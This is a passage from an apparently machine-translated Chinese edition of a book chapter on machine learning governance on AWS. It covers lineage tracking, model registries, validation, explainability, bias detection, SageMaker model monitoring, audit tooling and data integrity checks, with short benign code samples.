数据科学家和 ML 实践者必须能够验证可以使用相同的配置设置集以及其他“输入”,如训练数据集和算法，来构建和再现模型。如果我们正在处理一个单一的实验，手动跟踪这些相对容易。也许将这些信息存储在电子表格或减价文件中会有用！随着我们需求的发展，这些信息可能会在过程中丢失，特别是如果手工完成的话。也就是说，一旦我们需要使用超参数配置值的各种组合运行多个训练实验(例如，当使用 SageMaker 的**自动模型调整**功能时)，跟踪这种“历史”或**血统**将变得更加困难和棘手。好消息是 SageMaker 通过 **SageMaker ML 血统跟踪**和 **SageMaker 实验**自动帮助我们跟踪这一点。如果我们想让看到实验谱系以及其他细节， **SageMaker Studio** 让我们只需点击几下鼠标就能轻松获得这些信息。

注意

```
Machine Learning with Amazon SageMaker Cookbook) https://bit.ly/3POKbKf.
```

除了由 SageMaker 执行的自动化实验和沿袭跟踪之外，值得注意的是，我们还可以通过编程手动创建关联。我们还可以使用 **boto3** 和 **SageMaker Search** API 来获得关于用于训练 ML 模型的训练的细节和信息。在大多数情况下，我们使用 SageMaker 控制台以及可用的搜索功能就可以了。

如果您正在使用深度学习框架在 AWS 计算服务如 EC2、ECS 或 Lambda 上运行训练脚本，您可以使用库如 **ML 元数据**(用于 TensorFlow)来跟踪血统，以及 ML 管道中不同组件的工件。

注意

有关 **ML 元数据**的更多信息，请查看[https://www.tensorflow.org/tfx/tutorials/mlmd/mlmd_tutorial](https://www.tensorflow.org/tfx/tutorials/mlmd/mlmd_tutorial)。

## 模型库存

管理模型库存对于建立 ML 治理至关重要。能够维护一个有组织的模型清单使数据科学团队的关键成员能够立即了解模型的当前状态和性能。

在 AWS 上的 ML 环境中，有不同的方法来管理模型库存。我们可以做的一个可能的方法是使用各种服务构建一个定制的解决方案！例如，我们可以使用**亚马逊 DynamoDB** 、**亚马逊 S3** 、**亚马逊 ECR** 、**亚马逊 API 网关**和 **AWS Lambda** 从开始设计并构建一个*无服务器*模型注册表，如下图所示:

![Figure 9.6 – Custom-built model registry

](img/B18638_09_006.jpg)

图 9.6–定制的模型注册表

在这个定制的解决方案中，我们准备了以下 Lambda 函数:

*   **上传模型包**:用于上传模型包(包括 ML 模型工件、用于训练和推理的脚本、脚本运行环境的容器映像以及模型元数据)
*   `PENDING`、`APPROVED`或`REJECTED`状态)，以及存储模型包不同组件的标识符和路径
*   `PENDING`、`APPROVED`或`REJECTED`

如果我们需要扩展这个定制的模型注册中心的功能，我们可以很容易地添加更多的 Lambda 函数。这个选项将为我们提供最大的灵活性，代价是需要几天时间来设置整个系统。

另一个选择是使用现有的一个，比如 **MLFlow 模型注册表**，并将其部署在 EC2 实例或 ECS 容器中。最后，我们可以使用 **SageMaker Model Registry** ，它已经拥有我们需要的模型库存管理特性，比如模型批准和模型生命周期跟踪。

注意

请随意查看第 8 章 、*模型监控和管理解决方案*，了解更多关于如何使用 SageMaker 模型注册表的信息和细节。

## 模型验证

在一个 ML 模型被训练之后，它需要被评估以检查它的性能是否允许某些商业目标被实现。数据科学团队还需要验证模型的选择，因为简单模型可能倾向于**欠拟合**，而复杂模型倾向于**过拟合**。同时,需要审查用于模型验证的指标，因为一些指标代表模型性能的能力依赖于所解决问题的背景。例如，与欺诈检测用例的**准确性**相比，**平衡 F 分数**可能是更有意义的选项(因为由于类别不平衡，模型准确性分数可能仍然很高)。

注意

关于平衡 F 分数的更多信息，请随时查看[https://en.wikipedia.org/wiki/F-score](https://en.wikipedia.org/wiki/F-score)。

评估模型的第一种方式是通过**离线测试**，其中历史数据用于评估训练好的模型。这可以通过使用“维持集”的**验证来完成，这是不用于模型训练的数据。另一种选择是使用 **k 倍交叉验证**，这是一种检测过度拟合的流行技术。使用 SageMaker 时，可以通过多种方式进行离线测试:**

*   在 SageMaker 训练作业之后生成的模型文件(存储在`model.tar.gz`文件中)可以在不存在 SageMaker 推理端点的情况下使用适当的库或框架进行加载和评估。例如，使用 SageMaker 训练的**线性学习器**模型可以使用 **MXNet** 加载(例如，在容器中运行的自定义应用内)，如下面的代码块所示:

    ```
    def load_model():
    ```

    ```
        sym_json = json_load(open('mx-mod-symbol.json')) 
    ```

    ```
        sym_json_string = json_dumps(sym_json)
    ```

    ```
        model = gluon.nn.SymbolBlock( 
    ```

    ```
            outputs=mxnet.sym.load_json(sym_json_string), 
    ```

    ```
            inputs=mxnet.sym.var('data'))
    ```

    ```
        model.load_parameters(
    ```

    ```
            'mx-mod-0000.params', 
    ```

    ```
            allow_missing=True
    ```

    ```
        )
    ```

    ```
        model.initialize()
    ```

    ```
        return model
    ```

一旦评估了模型，就可以将它部署到推理端点。

*   另一种方法是将模型部署到“alpha”ML 推理端点，并使用历史数据对其进行评估。一旦评估步骤已经完成，模型可以被部署到“生产”ML 推理端点中，并且“alpha”端点可以被删除。

另一种方法涉及**在线测试**，使用实时数据评估模型。通过 SageMaker 的 A/B 测试支持，可以使用 SageMaker 执行在线测试，其中可以在一个推理端点下部署两个或多个模型。使用这种方法，一小部分流量可以被路由到在某段时间内被验证的模型的变体。一旦验证步骤完成，100%的流量可以完全路由到其中一个变体。

注意

查看以下笔记本，了解如何使用 SageMaker 设置多个模型的 A/B 测试示例:[https://bit.ly/3uSRZSE](https://bit.ly/3uSRZSE)。

既然我们已经讨论了模型评估，让我们更深入地研究 ML 的可解释性。

## ML 可解释性

在某些情况下，企业所有者和利益相关者拒绝使用某些类型的模型,原因是关于 ML 可解释性的问题。有时，由于 ML 模型的复杂性，很难从概念上解释它如何工作或者它如何产生预测或推断结果。一旦涉众对 ML 模型如何产生输出有了更多的可见性和理解，他们就有更大的机会批准使用某些模型。这包括了解每个要素对模型预测输出值的贡献。

注意

注意**模型可解释性**和**模型可解释性**经常被 ML 从业者互换。然而，这两个术语是不同的，应该小心使用。可解释性关注于一个 ML 模型是如何工作的——也就是说，它在内部是如何工作的。另一方面，可解释性关注 ML 模型的行为，包括输入特征值如何对预测输出值做出贡献。有关这个主题的更多信息，请随时查看[https://docs . AWS . Amazon . com/white papers/latest/model-explain ability-AWS-ai-ml/interpretatibility-vs-explain ability . XHTML](https://docs.aws.amazon.com/whitepapers/latest/model-explainability-aws-ai-ml/interpretability-versus-explainability.xhtml)。

ML 可解释性可以用**全局可解释性**和**局部可解释性**来接近。如果我们能够确定每个特征在所有预测中对模型预测的贡献程度，我们就可以说已经实现了全局可解释性。另一方面，如果我们能够确定每个特征对单个记录(或数据点)的模型预测有多大贡献，就可以实现局部可解释性。

注意

更多关于 ML explainability 的信息，请查看[https://docs . AWS . Amazon . com/sage maker/latest/DG/clarify-model-explain ability . XHTML](https://docs.aws.amazon.com/sagemaker/latest/dg/clarify-model-explainability.xhtml)。

当生成 ML 可解释性报告时，这里有一些可能的解决方案:

*   使用开源库(例如，`shap`库)并实现部署在 **AWS Lambda** 函数或 **Amazon ECS** 容器中的定制解决方案。
*   使用 **SageMaker Clarify** 运行作业并生成可解释报告:

    ```
    processor = SageMakerClarifyProcessor(...)
    ```

    ```
    processor.run_explainability(...)
    ```

*   使用开源库(例如，`shap`库)并使用 **SageMaker 处理**来运行定制代码，以及定制容器映像。

既然我们已经讨论了关于 ML 可解释性的，让我们跳到如何在 AWS 上使用各种解决方案来执行 ML 偏差检测。

## 偏差检测

检测 ML 偏差对于任何 ML 项目的成功都是至关重要的。如果 ML 偏差没有被检测和减轻，利用 ML 模型的自动化系统可能会以不公平的预测而告终。例如，基于 ML 的招聘应用可能对某些群体做出不公平的候选人选择(例如，对女性候选人)。另一个例子是一个自动贷款申请，它拒绝来自代表不足的群体(例如，那些生活在特定国家的群体)的贷款申请。

ML 偏差可以用多种指标来衡量。以下是可用于测量 ML 偏差的一些指标:

*   **等级不平衡**:测量并检测不同组之间成员数量的不平衡。
*   **标签不平衡**:测量，检测不同组之间阳性结果的不平衡。
*   **Kullback-Leibler (KL)散度**:这比较和测量不同组的结果分布有多不同。
*   **詹森-香农(JS)背离**:类似于 KL 背离，JS 背离比较并衡量不同组的结果分布有多大差异。

注意

如果你有兴趣在了解更多关于测量 ML 偏差的不同指标，请查看[https://docs . AWS . Amazon . com/sage maker/latest/DG/clarify-measure-data-bias . XHTML](https://docs.aws.amazon.com/sagemaker/latest/dg/clarify-measure-data-bias.xhtml)。

以下是使用 AWS 服务和功能检测 ML 偏差时的一些可能解决方案:

*   使用开源库(例如，`ResponsiblyAI/responsibly`)并实现部署在 **AWS Lambda** 函数或 **Amazon ECS** 容器中的定制解决方案。
*   使用 **SageMaker Clarify** 运行作业并生成训练前和训练后偏差报告:

    ```
    processor = SageMakerClarifyProcessor(...)
    ```

    ```
    processor.run_bias(...)
    ```

*   使用开源库(例如，`ResponsiblyAI/responsibly`库)并使用 **SageMaker 处理**来运行定制代码，以及定制容器映像。
*   使用 **SageMaker 模型监控器**和 **SageMaker Clarify** 监控部署在推理端点的模型中的偏差漂移。

检测到 ML 偏差后，下一步是通过各种方式解决和缓解问题(取决于 ML 偏差的背景和类型)。我们不会在本书中讨论不同的偏见缓解策略，因此可以随意查看 https://sage maker-examples . readthedocs . io/en/latest/end _ to _ end/fraud _ detection/3-improve-bias-train-Model 2-registry-e2e . XHTML # Develop-an-Unbiased-Model 以快速获得端到端示例。

## 模式监控

在 [*第 8 章*](B18638_08.xhtml#_idTextAnchor172) 、*模型监控和管理解决方案*中，我们启用了 ML 推理端点中的数据捕获，然后设置了调度监控，它从捕获的数据中检测违规和数据质量问题。这种设置将帮助我们尽早发现任何不一致之处，以便可以立即采取纠正措施。如果这些问题和矛盾得不到纠正，会发生什么？如果不立即应用纠正措施，部署的模型可能会经历性能衰减或退化，直到应用了“修复”。当然，在应用任何修正之前，我们需要首先检测这些不一致。也就是说，我们的下一个问题是，*我们如何检测这些不一致和问题？*

![Figure 9.7 – Detecting drift

](img/B18638_09_007.jpg)

图 9.7–检测漂移

在前面的图中，我们可以看到，我们可以通过对基线数据集和捕获的 ML 推断数据(通过 ML 推断端点)执行所需的分析(例如，数据质量检查)来检测“漂移”。一旦所需的分析完成，比较基线数据集和捕获的 ML 推断数据的结果，以查看结果中的差异是否超过某个阈值。

请注意，我们可以使用 **SageMaker 型号监视器**检测以下问题:

*   **数据质量漂移**:这是通过比较以下内容检测到的:
    *   **[" PROPERTIES "-A]**:用于训练所部署模型的基线数据集的统计性质和属性(例如，数据类型)
    *   **[" PROPERTIES "-B]**:捕获 ML 推断数据的属性
*   **型号性能漂移**:这是通过比较以下项目检测到的:
    *   **[" PROPERTIES "-A]**:基线数据集上模型的性能
    *   **[" PROPERTIES "-B]**:模型在捕获的 ML 推理数据上的性能(与上传的基本事实标签合并)
*   **模型偏差漂移**:这是通过比较以下项目检测到的:
    *   **[" PROPERTIES "-A]**:基线数据集上模型的偏差度量
    *   **[" PROPERTIES "-B]**:捕获的 ML 推理数据的偏差度量
*   **特征属性漂移**:这是通过比较以下检测到的:
    *   **[" PROPERTIES "-A]**:基线数据集的特征分布值
    *   **[" PROPERTIES "-B]**:捕获的 ML 推理数据的特征分布值

注意

为了更容易理解这些概念，让我们讨论一个简单的例子来说明`age`和`salary`是如何实现的。然后，我们使用这个训练数据集作为 SageMaker 模型监视器的基线。在分析数据集之后，SageMaker 模型监视器返回了一组建议的约束条件，这些约束条件要求年龄和工资值始终为正值。然后将 ML 模型部署到 SageMaker 推理端点，该端点被配置为收集包含输入和输出值(即年龄输入和预测工资值)的请求和响应数据。然后，我们配置了一个 SageMaker 模型监视器“schedule ”,由触发一个处理作业。这将分析收集的请求和响应数据，并检查是否违反了配置的约束。如果收集的数据包含年龄输入值的负值，SageMaker Model Monitor 应该能够检测到这一点，并在计划的处理作业完成运行后标记这一违规。

一旦分析了检测到的不一致和问题，数据科学团队可能会根据问题执行以下一项或多项修复或更正:

*   修复系统中向 ML 推理端点发送“坏数据”的问题。
*   用新模型替换已部署的模型。
*   纠正模型训练和部署管道中的现有问题。

现在，让我们看看可追溯性、可观察性和审计。

## 可追溯性、可观察性和审计

我们必须能够审计和检查 ML 实验或部署的每一步中发生的一切，不管这些步骤是手动还是自动执行的。这使我们能够轻松识别并修复问题，使系统返回到所需的配置状态。如果一个 ML 系统处于“不稳定”状态，ML 工程师必须能够使用正确的工具来快速排除故障并解决问题。

假设您的团队已经开始使用自动化的 ML 管道，该管道接受数据集作为输入，并生成二进制分类 ML 模型作为输出(在经历管道中的所有步骤之后)。几个星期以来，ML 管道运行良好...直到团队决定在管道中间的某个地方引入额外的数据处理步骤。团队注意到，不管输入值是多少，管道*生成的大多数二进制分类模型总是*返回一个`0`！在实现管道中的更改之前，所有生成的模型都已经返回了*0*和*1*(这是所期望的)。作为 ML 的工程师，你决定更深入地调查发生了什么...却发现 ML 管道步骤没有生成日志，这增加了故障排除的难度。同时，您发现没有合适的跟踪机制来帮助团队“连接点”并分析为什么生成的模型总是为分类结果产生一个`0`。在意识到需要几周的时间来排查和修复现有的问题之后，你的团队决定停止使用自动化的 ML 管道(这需要几个月的时间来构建和完善)并扔掉它。*哎哟！*如果跟踪和审计机制到位，自动化的 ML 管道可以更快地恢复到稳定状态。

注意

不要让这种事情发生在你和你的团队身上！在构建 ML 管道时，使用正确的工具非常重要。有关 ML 管道的更多信息，请随时查看 [*第 10 章*](B18638_10.xhtml#_idTextAnchor215) 、亚马逊 EKS 上带有 Kubeflow 的*机器学习管道*，以及 [*第 11 章*](B18638_11.xhtml#_idTextAnchor231) 、带有 SageMaker 管道的*机器学习管道*。

作为一名 ML 工程师，你需要知道这些类型需求的“工具”。在 AWS 中对 ML 环境和系统执行审计工作时，我们可以使用以下服务和功能:

*   **AWS CloudTrail** :这可以用于捕获和记录 AWS 帐户中的任何配置更改。
*   **AWS CloudTrail Lake** :这是一个用于 CloudTrail 数据分析的托管数据湖。
*   **Amazon CloudWatch 日志**:这包含来自各种服务的活动日志，比如 SageMaker、EC2 和 Redshift。
*   **Amazon Athena CloudWatch connector**:这使得 cloud watch 日志数据能够在 Amazon Athena 中使用 SQL 语句进行查询。
*   **SageMaker 模型注册**:这个可以用来跟踪模型部署批准。
*   **SageMaker 实验**和 **SageMaker 谱系**:在 SageMaker 中执行实验后，这些可用于审计和跟踪模型谱系。
*   **AWS 审计管理器**:这可以用于简化和加速 AWS 账户的审计过程。
*   **AWS X 射线**:这可以用于跟踪整个应用中的请求，并排除分布式应用中的性能瓶颈。

我们不会深究如何使用这些服务的细节，所以请随意查看本章末尾的*延伸阅读*部分了解更多细节。

## 数据质量分析和报告

能够尽早发现数据质量问题将有助于我们管理与这些问题相关的任何风险。同时，我们将能够对 ML 系统的实施、设置或架构进行任何所需的短期和长期修正。在本节中，我们将讨论一些可能的解决方案，用于分析用于训练和推理的数据的质量。

第一个解决方案涉及使用定制代码和开源包来准备和生成数据质量报告。在 [*第一章*](B18638_01.xhtml#_idTextAnchor017) ，*AWS 上的 ML 工程介绍*中，我们使用了一个名为`pandas_profiling`的 Python 库来自动分析我们的数据并生成 profile 报告。请注意，我们也可以使用类似的库和包。当然，使用这种方法，我们必须自己管理基础设施方面。如果我们想升级这个设置，我们可以选择在使用 **AWS Lambda** 的无服务器功能中部署我们的定制数据配置脚本，或者在使用 **Amazon ECS** 的容器化应用中部署。

另一个可行的选择是避免我们自己构建定制的解决方案，而简单地使用一个现有的服务，让我们专注于我们的目标和责任。在 [*第五章*](B18638_05.xhtml#_idTextAnchor105) 、*实用数据处理和分析*中，我们使用 **AWS Glue DataBrew** 来加载、配置和处理我们的数据。运行分析作业后，我们可以访问额外的分析和信息，包括缺失的单元格值、数据分布统计和重复行。

注意

推断过程中也可能出现数据质量问题。一旦我们将一个 ML 模型部署到一个推理端点中，这个模型就可以对带有缺失值和数据质量问题的请求有效负载做出预测。在 [*第 8 章*](B18638_08.xhtml#_idTextAnchor172) 、*模型监控和管理解决方案*中，我们启用了数据捕获，并自动化了检测通过 SageMaker 实时推理端点的数据质量违规的流程。我们安排了一个模型监控处理作业，该作业将处理数据，然后生成一个包含不同相关违规统计信息的自动报告(大约每小时一次)。

## 数据完整性管理

维护和管理数据完整性并不是一件容易的事情。检测和修复数据质量问题(如缺失值和重复行)只是挑战的第一部分。管理数据完整性问题是下一个挑战，因为我们需要更进一步，确保存储在数据库中的数据是完整、准确和一致的。

在 [*第 4 章*](B18638_04.xhtml#_idTextAnchor079) 、*AWS 上的无服务器数据管理*中，我们将一个合成数据集加载到一个数据仓库(使用红移无服务器)和一个数据湖(使用亚马逊雅典娜、亚马逊 S3 和 AWS Glue)。当我们在数据集上执行一些示例查询时，我们只是假设不需要担心数据质量和数据完整性问题。让我们回忆一下，我们的数据集包含大约 21 列，其中包括一些“派生”列。“派生”列的一个很好的例子是`has_booking_changes`列。如果`booking_changes`列值大于`0`，则`has_booking_changes`列值预计为`True`。否则`has_booking_changes`的值应该是`False`。为了识别`booking_changes`列值与`has_booking_changes`列值不匹配的记录，我们在无服务器数据仓库(Redshift Serverless)中执行了以下查询:

```
SELECT booking_changes, has_booking_changes, * 

FROM dev.public.bookings 

WHERE 

(booking_changes=0 AND has_booking_changes='True') 

OR 

(booking_changes>0 AND has_booking_changes='False');
```

以下是解决这个问题的几种方法:

*   如果只有少数记录受到影响(相对于记录总数)，那么我们可以(软)删除受影响的记录，并从数据处理工作流的未来步骤中排除这些记录。请注意，由于排除记录可能会显著影响数据分析结果和 ML 模型性能(如果数据集用于训练 ML 模型)，因此应谨慎操作。
*   我们可以执行一个`UPDATE`语句来修正`booking_changes`列的值。

请注意，另一个可能的长期解决方案是在数据加载到数据仓库或数据湖之前执行所需的数据完整性检查和纠正。这意味着数据仓库或数据湖中的数据在初始数据加载时应该已经是“干净的”,我们可以在这些集中式数据存储中安全地执行查询和其他操作。

注意

除此之外，还必须审查与数据交互的应用和系统。请注意，即使我们清理了数据，连接的应用仍有可能引入一系列新的数据完整性问题，因为根本原因尚未解决。

*差不多就是这样！*此时，在建立 ML 治理时，我们应该有更广泛的选择来解决各种问题和挑战。请随意再读一遍这一章，以帮助你更深入地理解不同的概念和技术。

# 总结

在本章中，我们讨论了管理 ML 环境和系统的整体安全性、合规性和治理的各种策略和解决方案。我们首先通过几个最佳实践来提高 ML 环境的安全性和合规性。之后，我们讨论了如何保护数据隐私和模型隐私的相关技术。在本章末尾，我们介绍了使用各种 AWS 服务建立 ML 治理的不同解决方案。

在下一章中，我们将快速介绍 **MLOps 管道**，然后使用 **Kubeflow 管道**深入研究 AWS 中的自动化 ML 工作流。

# 延伸阅读

有关本章涵盖的主题的更多信息，请随时查阅以下资源:

*   *AWS IAM 最佳实践*([https://aws.amazon.com/iam/resources/best-practices/](https://aws.amazon.com/iam/resources/best-practices/))
*   *VPC 的安全最佳实践*([https://docs . AWS . Amazon . com/VPC/latest/user guide/VPC-Security-Best-Practices . XHTML](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-best-practices.xhtml))
*   *AWS private link concepts*([https://docs . AWS . Amazon . com/VPC/latest/private link/concepts . XHTML](https://docs.aws.amazon.com/vpc/latest/privatelink/concepts.xhtml))
*   *AWS 审计管理器概念*([https://docs . AWS . Amazon . com/Audit-Manager/latest/user guide/concepts . XHTML](https://docs.aws.amazon.com/audit-manager/latest/userguide/concepts.xhtml))
*   *AWS 合规中心*([https://AWS . Amazon . com/financial-services/security-Compliance/Compliance-Center/](https://aws.amazon.com/financial-services/security-compliance/compliance-center/))
*   *在 AWS 神器中下载报表*([https://docs . AWS . Amazon . com/Artifact/latest/ug/Downloading-documents . XHTML](https://docs.aws.amazon.com/artifact/latest/ug/downloading-documents.xhtml))